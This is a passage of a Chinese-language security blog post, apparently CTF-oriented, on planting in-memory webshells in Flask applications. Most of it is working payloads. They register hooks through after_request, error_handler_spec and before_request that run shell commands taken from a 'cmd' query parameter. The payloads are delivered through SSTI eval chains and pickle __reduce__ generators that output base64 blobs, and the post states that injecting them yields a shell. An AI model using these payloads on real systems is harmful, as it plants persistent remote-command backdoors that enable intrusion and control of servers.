+        <span class="token keyword">global</span> CmdResp<span class="token punctuation">;</span>     <span class="token comment"># 定义一个全局变量，方便获取</span>
+        CmdResp<span class="token operator">=</span>make_response<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span>\'cmd\'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 创建一个响应对象</span>
+    '<span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span>    <span class="token comment"># 恒真</span>
+    <span class="token keyword">else</span> resp<span class="token punctuation">)</span>  <span class="token comment"># 如果请求参数没有cmd则正常返回</span>
+<span class="token comment"># 这里的cmd参数名和CmdResp变量名都是可以改的，最好改成服务中不存在的变量名以免影响正常业务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>打入后就getshell了</p>
+<hr>
+<h2 id="其它的钩子"><a href="#其它的钩子" class="headerlink" title="其它的钩子"></a>其它的钩子</h2><p>都是gxngxngxn师傅找到的，tql</p>
+<p><code>teardown_request</code>：跟前面<code>after_request</code>的类似，payload也通用，改个调用的底层函数名就行，但是无回显。。</p>
+<h3 id="error-handler-spec"><a href="#error-handler-spec" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><blockquote>
+<p>该函数用于自定义404页面的回显</p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">errortest</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error_handler(404)'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">'404 Err0r'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810012504500.png" alt="image-20240810012504500"></p>
+<p>跟进这个装饰器的底层逻辑</p>
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810012603684.png" alt="image-20240810012603684"></p>
+<p>发现眼熟的东西，当然按照旧版内存马的方式直接调用<code>register_error_handler</code>同样是不行的</p>
+<p>但是值得注意的是，这里传入<code>register_error_handler</code>的参数有<code>code_or_exception</code>和<code>f</code></p>
+<p><code>f</code>依旧是我们可控的函数，那么接下来就是要构造<code>code_or_exception</code>使得<code>code</code>和<code>exc_class</code>也可控，在前面<code>code_or_exception</code>的值为404</p>
+<p>跟进一下<code>_get_exc_class_and_code</code></p>
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810013648894.png" alt="image-20240810013648894"></p>
+<p>那这还构造个啥，直接<code>_get_exc_class_and_code(404)</code>，这样就能返回常规的变量了</p>
+<p>payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810014235559.png" alt="image-20240810014235559"></p>
+<hr>
+<h2 id="got-first-request"><a href="#got-first-request" class="headerlink" title="_got_first_request"></a>_got_first_request</h2><p>将_got_first_request这个判断置成false即可调用add_url_rule</p>
+<hr>
+<h2 id="ssti利用"><a href="#ssti利用" class="headerlink" title="ssti利用"></a>ssti利用</h2><p>考虑到上下文没有导入包的情况</p>
+<p>注：部分flask版本下无法使用<code>url_for.__globals__[&#39;current_app&#39;]</code>来获取app，因此这里改用<code>sys.modules</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810011718358.png" alt="image-20240810011718358"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"exec(\"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()\")"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="pickle利用"><a href="#pickle利用" class="headerlink" title="pickle利用"></a>pickle利用</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> base64
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen(request.args.get('cmd')).read())"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
+b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> base64
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__('sys').modules['__main__'].__dict__['app'].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
+b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> base64
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
+b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
